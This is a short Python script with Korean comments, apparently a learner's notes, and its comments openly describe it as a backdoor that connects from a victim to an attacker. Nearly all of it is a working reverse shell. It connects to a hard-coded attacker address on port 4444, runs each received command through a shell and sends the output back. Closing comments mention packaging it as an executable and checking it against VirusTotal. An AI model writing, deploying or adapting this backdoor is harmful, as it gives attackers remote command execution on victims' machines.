# client
# 클라이언트가 서버로 연결을 시도하는 코드
# 즉 피해자가 공격자 측으로 연결을 시도하는 악성코드 또는 백도어라고 볼 수 있다.

import socket
import subprocess
import os


def set_sock(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((ip, port))
    return s


def connect_cnc(s):
    while True:
        cwd = os.getcwd()
        command = s.recv(65535).decode().lower()
        if command == "exit":
            s.close()
            break
        elif command == "pwd":
            s.send(cwd.encode("utf-8"))
            continue

        try:
            if command.startswith("cd"):
                os.chdir(command[3:].replace("\n", ""))
                command = ""
                cwd = os.getcwd()
                s.send(cwd.encode("euc-kr"))
                continue
        except Exception as e:
            s.send(str(e).encode("euc-kr", "ignore"))

        proc = subprocess.Popen(   #Subprocess 모듈은 새로운 프로세스를 생성 및 관리함
            command,
            shell=True,
            stdout=subprocess.PIPE, #PIPE 는 프로세스 간 통신할 수 있는 통로라고 생각하자
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)


if __name__ == "__main__":
    ip = "192.168.0.5"  # 연결할 공격자의 아이피 주소
    port = 4444
    s = set_sock(ip, port)
    connect_cnc(s)

# pyinstaller
# virustotal.com  생성한 exe 파일을 업로드해 악성 코드인지 판별가능
